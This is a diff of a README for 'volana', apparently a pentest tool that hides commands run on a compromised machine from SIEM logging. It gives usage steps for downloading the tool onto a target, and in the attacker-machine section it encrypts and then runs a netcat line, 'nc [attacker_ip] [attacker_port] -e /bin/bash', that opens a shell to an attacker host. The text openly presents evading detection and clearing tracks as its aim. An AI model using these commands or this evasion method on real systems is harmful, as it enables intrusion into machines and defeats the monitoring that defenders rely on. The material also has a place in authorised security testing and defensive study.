@@ -5,13 +5,13 @@
 
 
 <p><strong><pre><code>{ <a href="#usage">Use it</a> ; <a href="#hide-from">🌚<sub>(hide from)</sub></a>; <a href="#visible-for">🌞<sub>(detected by)</sub></a> } </code></pre></strong></p>
-<h4> Shell command obfuscation to avoid SIEM detection </h4>
- <p> During pentest, an important aspect is to <b>be stealth</b>. For this reason you should <b>clear your tracks after your passage</b>. Nevertheless, many infrastructures log command and send  them to a SIEM in a real time making the cleaning part alone useless.<br><br><code>volana</code> provide a simple way to hide commands executed on compromised machine by providing it self shell runtime (enter your command, volana execute for you). Like this y you <b>clear your tracks DURING your passage</b></p>
+<h4> Shell command obfuscation to avoid SIEM/detection system </h4>
+ <p> During pentest, an important aspect is to <b>be stealth</b>. For this reason you should <b>clear your tracks after your passage</b>. Nevertheless, many infrastructures log command and send  them to a SIEM in a real time making the afterwards cleaning part alone useless.<br><br><code>volana</code> provide a simple way to hide commands executed on compromised machine by providing it self shell runtime (enter your command, volana executes for you). Like this you <b>clear your tracks DURING your passage</b></p>
 </div>
 
 ## Usage
 
-You need to get an interactive shell. (Find a way to spawned it, you are a hacker, it's your job !). Then download it on target machine and launch it. that's it, now you can type the command you want to be stealthy executed 
+You need to get an interactive shell. (Find a way to spawn it, you are a hacker, it's your job ! [otherwise](#from-non-interactive-shell)). Then download it on target machine and launch it. that's it, now you can type the command you want to be stealthy executed 
 ```shell
 ## Download it from github release
 ## If you do not have internet access from compromised machine, find another way
@@ -36,24 +36,22 @@ Previously, you need to build `volana` with embedded encryption key.
 
 **On attacker machine**
 ```shell
-## ATTACKER MACHINE
-
 ## Build volana with encryption key
-make build.volana-with-enc
+make build.volana-with-encryption
 
 ## Transfer it on TARGET (the unique detectable command)
 ## [...]
 
 ## Encrypt the command you want to stealthy execute
 ## (Here a nc bindshell to obtain a interactive shell)
-volana encrypt "nc [attacker_ip] [attacker_port] -e /bin/bash"
+volana encr "nc [attacker_ip] [attacker_port] -e /bin/bash"
 **encrypted cmd**
 ```
 
 Copy encrypted command and executed it with your rce **on target machine**
 ```shell
-./volana decrypt [encrypted_command]
-## Now you have a bindshell shell, spawn it to make it interactive and use volana normally)
+./volana decr [encrypted_command]
+## Now you have a bindshell shell, spawn it to make it interactive and use volana usually to be stealth (.volana)
 
 ```
 
